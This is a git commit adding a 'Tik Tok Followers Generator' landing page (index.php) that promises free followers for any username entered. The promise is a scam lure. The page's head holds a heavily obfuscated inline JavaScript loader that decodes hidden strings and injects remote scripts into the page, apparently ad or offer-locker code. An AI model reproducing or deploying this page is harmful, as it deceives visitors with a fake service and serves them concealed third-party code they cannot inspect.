d3257a37351663265a2cff7f51a96fe2a20b070f
tiktokfollowme <123711192+tiktokfollowme@users.noreply.github.com>
2023-01-27 15:33:52 +0100

    Add files via upload

---
+++ Tik Tok Gen Landing/index.php
@@ -0,0 +1,111 @@
+<!-- 
+
+//
+//
+//Landing Page Shared at CPALanding.com
+//https://www.cpalanding.com
+//
+//
+
+ -->
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+	<head>
+		<title>Tik Tok Followers Generator</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+		<meta name="description" content="Tik Tok Followers Generator" />    
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<link rel="icon" type="image/ico" href="img/favicon.ico" />
+		<!-- Open Graph Meta Tags-->
+		<meta property="og:title" content="Tik Tok Followers Generator" /> <!-- Title which is displayed when your site is shared on social networks -->
+		<meta property="og:description" content="Tik Tok Followers Generator" /> <!-- Website description which is displayed when your site is shared on social networks -->
+		<meta property="og:type" content="website" />
+		<meta property="og:url" content="http://www.mywebsiteurl.com/" /> <!-- Your Website URL -->
+		<meta property="og:image" content="http://www.mywebsiteurl.com/social-share-image.jpg" />	<!-- Absolute Path to the Image which will display, when your website is shared on social networks -->
+		<!-- Twitter Meta -->
+		<meta name="twitter:card" content="summary" />
+		<meta name="twitter:site" content="@tweetname" />
+		<meta name="twitter:title" content="Tweet Title" />
+		<meta name="twitter:description" content="Tweet Content" />
+		<meta name="twitter:image" content="http://www.mywebsiteurl.com/twitter-share-image.jpg" />
+		<!-- Icons -->
+		<link rel="stylesheet" href="https://cdn.linearicons.com/free/1.0.0/icon-font.min.css">
+		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+		<!-- Google Fonts -->
+		<link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,700,900&display=swap" rel="stylesheet">
+		<!-- CSS -->
+		<link href="css/bootstrap.min.css" rel="stylesheet" />  
+		<link href="css/animate.css" rel="stylesheet" />
+		<link href="css/magnific-popup.css" rel="stylesheet" />
+		<link href="css/style.css" rel="stylesheet" />
+		
+		<script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var e3237b951e4009cf6af64ea947159887="EXYisQd57jkforFQ1RWxIIb_hY7smYCSl7Wk_WFBUEp4S4weZJeo90PeUdkVCx6rL9Bf9EMOi8Uwo6ZFzYdi";var a=['T3oLT8KAwoLCv3bCi3vDsgDCmw==','wrked8OLwoUrShIK','w7gpNcKfw5fCqk3Culh2w4g=','KMOqwqkNXcO2w5DCuAUlw70MQcKtw7wpwo/CjsK4A8O5VzUUesKYw4PDhkDDosKHwrs6FDsQw68=','XcKDcCvCsUvDrsKzYBfDnS4=','R8KyZMO8wpQSF8Kaw7XDrcK+P8KHAMOtJcKQw5TDmQ8=','ETvDvxvCmMKYwqE=','woTDgMK3Nw==','w53Cpn0=','TzvClxrCm8Kn','w4BPw7fCu1oSwr3DoCZfTcK6w7kFJcK/woR+w71+w4zDl8KYPCzCmMO3w7Aiw68UBcOWwqTDon4rwprDnsOcAAUgcsKceg==','ETHDug/CgMKRwrt+','w5AYw6TCpEUXw6/DsDUbS8KswqBEfw==','w6kew43Dn29heMKKwrnDmmx2','wrrDg8KhKSo=','w6vCisOp','wrJQw6jDkEEUeA==','wrY0EArDhmQ=','w6UPw5XDjmUZMsOR','Q2dNwprCm8KQ','wqgCX8Oa','OirClyfCt3rCkcKBYsO8wqzCplU=','O8Oywr1WUsO2w4rCuA==','dnAPw5hBw5rDkcOzbsOCbMK6CMKo','w4luFsKhw6pRNjbDpwI=','BjfDrR/CpMKQ','w5nDrCM4w47Co8Krw73CpRNiw5U='];(function(b,c){var d=function(g){while(--g){b['push'](b['shift']());}};d(++c);}(a,0xda));var c=function(b,d){b=b-0x0;var e=a[b];if(c['Lsypog']===undefined){(function(){var h;try{var j=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');h=j();}catch(k){h=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';h['atob']||(h['atob']=function(l){var m=String(l)['replace'](/=+$/,'');var n='';for(var o=0x0,p,q,r=0x0;q=m['charAt'](r++);~q&&(p=o%0x4?p*0x40+q:q,o++%0x4)?n+=String['fromCharCode'](0xff&p>>(-0x2*o&0x6)):0x0){q=i['indexOf'](q);}return n;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};c['ieTfYu']=g;c['xTHHDo']={};c['Lsypog']=!![];}var f=c['xTHHDo'][b];if(f===undefined){if(c['kdeskg']===undefined){c['kdeskg']=!![];}e=c['ieTfYu'](e,d);c['xTHHDo'][b]=e;}else{e=f;}return e;};var b=window;b[c('0x5','(6I$')]=[[c('0x17','Vywj'),0x493808],[c('0x7','mSmQ'),0x0],[c('0x15','nDyG'),c('0xd','(6I$')],[c('0xb','aHST'),0x0],[c('0x4','Vywj'),![]],[c('0x19','YG&b'),0x0],[c('0x18','ZocG'),!0x0]];var q=[c('0x1','wRY5'),c('0x8','sTQJ')],n=0x0,d,v=function(){if(!q[n])return;d=b[c('0x14','wRY5')][c('0x13','[Zp9')](c('0xf','(SAT'));d[c('0x12','iXMt')]=c('0xa','sTQJ');d[c('0xc','(6I$')]=!0x0;var e=b[c('0x9','Vywj')][c('0x3','aQQY')](c('0x11',']i9G'))[0x0];d[c('0x6','NUy1')]=c('0x10','aHST')+q[n];d[c('0x0','iJ0v')]=c('0x1a','#!Y3');d[c('0xe','Dz7v')]=function(){n++;v();};e[c('0x16','2r1h')][c('0x2',')V9L')](d,e);};v();})();
+/*]]>/* */
+</script>
+
+	</head>
+	<body>	
+		<div class="main-bg"></div>
+		<div class="main-wrapper">			
+				<header>					
+					<div class="branding-wrapper">						
+						<img src="img/logo-sign.svg" class="img-fluid logo-img-1" alt="Tik Tok" />
+						<img src="img/logo-text.svg" class="img-fluid logo-img-2" alt="Tik Tok" />
+					</div>
+				</header>
+				<div class="after-header-wrapper">
+					<h1>Followers Generator</h1>
+					<h4>Get free followers for your Tik Tok account.</h4>
+					<div class="generator-status">
+						<div class="generator-status-content">
+							<div class="status-item-wrapper animated bounceIn animation-delay-400">
+								<span class="status-label">Status:</span>
+								<span id="status" class="status-dynamic">Online</span>
+							</div>
+							<div class="status-item-wrapper status-item-wrapper-2 animated bounceIn animation-delay-600">
+								<span class="status-label">Last Update:</span>
+								<span id="date" class="status-dynamic"></span>
+							</div>
+							<div class="status-item-wrapper animated bounceIn animation-delay-800">
+								<span class="status-label">Online Users:</span>
+								<span id="online-count" class="status-dynamic"></span>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="main-content">
+					<div class="container">
+						<div class="generator-wrapper">
+							<div class="generator-content">								
+								<div class="form-wrapper">
+									<img src="img/logo-sign.svg" class="img-fluid logo-img-gen" alt="Tik Tok" />
+									<div class="label animated bounceIn animation-delay-400">Your Tik Tok Username</div>
+									<div class="animated bounceIn animation-delay-600">
+										<div class="input-wrapper username-wrapper">
+											<img src="img/input-icon.png" class="input-icon" />
+											<input type="text" id="player-username" class="s-input" placeholder="Username..." />
+										</div>
+									</div>
+									<div class="button-wrapper animated bounceIn animation-delay-1000">
+										<div id="proc-btn-1" class="tkt-btn">
+											<span>Connect</span>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+					<div class="bg-detail"><img src="img/tik-tok-bg-detail.png" class="img-fluid bt-detail-img" /></div>
+				</div>		
+		</div>
+		<div class="modal-outer"></div>
+	</body>
+	<!-- JS -->	
+	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+	<script type="text/javascript" src="js/jquery.magnific-popup.min.js"></script>	
+	<script type="text/javascript" src="js/ion.sound.min.js"></script>	
+    <script type="text/javascript" src="js/jquery.countTo.js"></script>
+    <script type="text/javascript" src="js/main.js"></script>
+</html>
